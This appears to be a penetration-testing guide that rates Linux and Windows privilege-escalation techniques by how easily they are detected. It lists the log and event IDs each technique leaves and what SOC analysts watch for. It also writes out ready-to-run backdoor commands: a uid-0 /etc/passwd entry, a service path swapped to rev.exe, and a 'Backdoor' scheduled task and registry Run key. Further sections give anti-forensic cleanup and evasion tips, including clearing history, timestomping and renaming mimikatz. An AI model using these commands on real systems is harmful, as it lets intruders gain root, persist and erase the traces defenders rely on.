# OPSEC Guide for Privilege Escalation

Operational security ratings for every privesc technique. Know what you're leaving behind.

---

## OPSEC Rating Legend
- 🟢 **Quiet** — Passive enumeration, no files written, minimal log footprint
- 🟡 **Moderate** — Writes temp files, appears in some logs, moderate detection risk
- 🔴 **Loud** — Triggers alerts, modifies system state, high detection probability

---

## 🟢 Quiet Techniques (Enumeration Only)

### Linux
```bash
# All of these are read-only — no writes, no alerts
sudo -l                                    # Reads sudoers (no auth.log entry if NOPASSWD)
find / -perm -4000 -type f 2>/dev/null     # File stat only
getcap -r / 2>/dev/null                    # Read extended attributes
cat /etc/crontab                           # Read file
cat /etc/exports                           # Read file
cat /etc/passwd                            # World-readable
ls -la /var/run/docker.sock                # Stat file
id; groups; whoami                         # Process info
uname -a; cat /proc/version               # Read proc
ps auxf                                    # Read proc
env; echo $PATH                            # Current process env
mount; df -h                               # Read mount info
ip a; ss -tlnp                             # Read network state
cat /proc/1/cgroup                         # Container detection
capsh --print                              # Read current caps
```

**Log footprint:** None. These commands read existing files/procfs — nothing written to auth.log, syslog, or audit logs unless auditd has aggressive file-access rules.

### Windows
```powershell
whoami /all                                # Token query
systeminfo                                 # WMI query
net user; net localgroup administrators    # SAM query
reg query HKLM\...\AlwaysInstallElevated   # Registry read
reg query HKLM\...\Winlogon                # Registry read
cmdkey /list                               # Credential manager read
schtasks /query /fo LIST /v                # Task scheduler read
wmic service get name,pathname,startmode   # Service enumeration
icacls "C:\path\to\file"                   # ACL read
```

**Log footprint:** Minimal. May appear in Sysmon (Process Create events 1, 10) if configured, but these are normal admin commands.

---

## 🟡 Moderate Techniques

### Automated Enumeration Tools
```bash
# linpeas.sh — writes to /dev/shm or /tmp, reads many files
# Detection: file creation in /tmp, rapid file access patterns
# Logs: none directly, but EDR/auditd catches the burst of file reads
./linpeas.sh -a 2>&1 | tee /dev/shm/.lin.out
# Cleanup: rm /dev/shm/.lin.out

# pspy — monitors /proc for new processes (polling)
# Detection: high CPU from polling /proc, creates no files
# Logs: none, but memory-resident binary may trigger EDR
./pspy64 -pf -i 1000

# linux-exploit-suggester — reads kernel version, checks CVEs
# Detection: file in /tmp, process execution
# Logs: none

# WinPEAS — writes temp files, queries many system APIs
.\winpeas.exe quiet
# Detection: high volume of registry reads, WMI queries, file access
# Event IDs: Sysmon 1 (Process Create), 11 (File Create), 13 (Registry Value Set)

# PowerUp / SharpUp — PowerShell/C# enumeration
# Detection: PowerShell ScriptBlock logging (Event ID 4104)
# AMSI may flag PowerUp.ps1
Import-Module .\PowerUp.ps1; Invoke-AllChecks
```

### Service Exploitation (Controlled)
```bash
# SUID binary exploitation — executes a binary with elevated privs
# Detection: new process with EUID=0, unusual parent process
# Logs: may appear in auth.log as su/sudo usage

# Potato attacks (PrintSpoofer, GodPotato, etc.)
# Detection: named pipe creation, token manipulation
# Event IDs: 4688 (Process Create), 4672 (Special Privileges Assigned)
# EDR: token impersonation is a common detection signature

# NFS SUID creation — creates file on NFS share
# Detection: new SUID binary, NFS mount activity
# Logs: NFS server access logs
```

### Credential Access During Privesc
```powershell
# mimikatz — highly detected
# Detection: signature-based AV, AMSI, credential guard
# Event IDs: 4688, 10 (Process Access to lsass), 4648 (Logon with explicit creds)
# MUST evade: obfuscate, use alternatives (nanodump, handlekatz)

# secretsdump.py — remote, DRSUAPI calls
# Detection: 4662 (Directory Service Access), 4624 (Logon)
# Replication traffic from non-DC is anomalous
```

---

## 🔴 Loud Techniques

### Kernel Exploits
```bash
# DirtyCow, DirtyPipe, Netfilter, etc.
# Risk: kernel panic, system crash, data corruption
# Detection: unusual process behavior, system instability
# Logs: kernel oops/panic in dmesg, syslog
# CRASH RISK: DirtyCow (race condition) > Netfilter > DirtyPipe (cleaner)
# Post-exploit: system may be unstable — capture proof immediately

# PwnKit / Baron Samedit — userland, safer
# Detection: unusual pkexec/sudoedit invocation
# Logs: auth.log (sudo), syslog
# Less crash risk than kernel exploits but still triggers logging
```

### System Modification
```bash
# Adding users to /etc/passwd or /etc/shadow
# Detection: file integrity monitoring (AIDE, OSSEC, Tripwire)
# Logs: auth.log (useradd), /etc/passwd modification timestamp
echo 'hacker:...:0:0:root:/root:/bin/bash' >> /etc/passwd
# ⚠️ Immediately visible to: ls -la /etc/passwd, AIDE/Tripwire, auth.log

# Modifying service configurations
sc config VulnSvc binpath= "C:\temp\rev.exe"
# Event IDs: 7040 (Service status change), 4697 (Service installed)
# Detection: service binary path change is a HIGH-confidence alert

# Modifying scheduled tasks
schtasks /create /tn "Backdoor" /tr "C:\temp\rev.exe" /sc onlogon /ru SYSTEM
# Event IDs: 4698 (Scheduled task created), 106 (Task registered)
# Detection: new scheduled task creation — commonly monitored

# Modifying registry autorun
reg add HKLM\...\Run /v Backdoor /d "C:\temp\payload.exe"
# Event IDs: 13 (Sysmon Registry Value Set), 4657 (Registry value modified)
# Detection: autorun modification — high-priority SOC alert

# Writing DLLs to system paths
# Detection: file integrity monitoring, new DLL in system directory
# Event IDs: 7 (Sysmon Image Loaded) for unsigned DLL
```

---

## Log Footprints by Platform

### Linux Logs to Monitor
| Log File | What's Recorded | Relevant Techniques |
|----------|----------------|-------------------|
| `/var/log/auth.log` | sudo attempts, su, SSH logins, PAM events | sudo abuse, user creation, password changes |
| `/var/log/syslog` | System events, cron execution, service starts | cron exploitation, service modification |
| `/var/log/kern.log` | Kernel messages, module loads | Kernel exploits, container escapes |
| `/var/log/audit/audit.log` | auditd events (if enabled) | Everything — file access, exec, capability use |
| `~/.bash_history` | Command history | All interactive commands |
| `/var/log/cron.log` | Cron job execution | Cron-based privesc |

### Windows Event Log IDs
| Event ID | Log | Description | Triggered By |
|----------|-----|-------------|-------------|
| 4624 | Security | Successful logon | Pass-the-hash, runas, token manipulation |
| 4625 | Security | Failed logon | Password guessing, bad hashes |
| 4648 | Security | Logon with explicit credentials | RunAs, mimikatz |
| 4672 | Security | Special privileges assigned | Token impersonation, Potato attacks |
| 4688 | Security | Process creation | Any new process (if auditing enabled) |
| 4697 | Security | Service installed | Service binary replacement |
| 4698 | Security | Scheduled task created | Task-based persistence/privesc |
| 7040 | System | Service status change | Service modification |
| 1 | Sysmon | Process create | All process execution |
| 7 | Sysmon | Image loaded | DLL hijacking |
| 10 | Sysmon | Process access | Mimikatz accessing LSASS |
| 11 | Sysmon | File created | Payload drops, temp files |
| 13 | Sysmon | Registry value set | Autorun modification |

---

## Cleanup Procedures

### After Linux Privesc
```bash
# Remove SUID shells
rm -f /tmp/rootbash /tmp/suid

# Remove compiled exploits
rm -f /tmp/*.c /tmp/*.so /tmp/exploit /tmp/PwnKit

# Clean bash history
history -c
echo "" > ~/.bash_history
# Or unset history at start: unset HISTFILE

# Restore modified files
# If /etc/passwd was modified — remove added lines
# If cron script was modified — restore from backup
# If service file was modified — restore original ExecStart

# Remove pspy/linpeas output
rm -f /dev/shm/.lin.out /tmp/pspy64 /tmp/linpeas.sh

# Check timestamps
touch -r /etc/hostname /path/to/modified/file  # Match timestamps
```

### After Windows Privesc
```powershell
# Remove uploaded tools
del C:\Windows\Temp\PrintSpoofer64.exe
del C:\Windows\Temp\winpeas.exe
del C:\Windows\Temp\rev.exe
del C:\Windows\Temp\evil.msi

# Restore service config
sc config VulnSvc binpath= "C:\Program Files\VulnApp\original.exe"

# Clear PowerShell history
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force
Clear-History

# Clean registry (UAC bypass)
reg delete HKCU\Software\Classes\ms-settings /f 2>nul
reg delete HKCU\Software\Classes\mscfile /f 2>nul

# Clear certutil cache
certutil -urlcache * delete
```

---

## What SOC Analysts Look For

### High-Confidence Privesc Indicators
1. **New SUID binary** created in /tmp or /dev/shm
2. **Service binary path change** — almost never legitimate
3. **LSASS access** from non-system process (Sysmon event 10)
4. **Named pipe impersonation** — Potato attack signature
5. **Rapid file enumeration** — linpeas/winpeas pattern (thousands of file reads in seconds)
6. **New scheduled task** running as SYSTEM from user context
7. **Registry autorun modification** from non-admin process
8. **Unusual parent-child process** — cmd.exe spawned by IIS worker, python spawned by find
9. **pkexec** or **sudoedit** with unusual arguments (PwnKit/Baron Samedit)
10. **DCSync traffic** — DRSUAPI calls from non-DC IP

### Evasion Notes (Authorized Testing Only)
```
- Run enumeration from memory when possible (avoid disk writes)
- Use /dev/shm instead of /tmp (often not monitored, tmpfs)
- Rename tools: cp linpeas.sh /dev/shm/.config
- Timestomp modified files: touch -r /etc/resolv.conf /path/to/modified
- Disable history: unset HISTFILE; export HISTSIZE=0
- Windows: use in-memory execution where possible (PowerShell, .NET assemblies)
- Avoid well-known tool names: rename mimikatz.exe, winpeas.exe
```
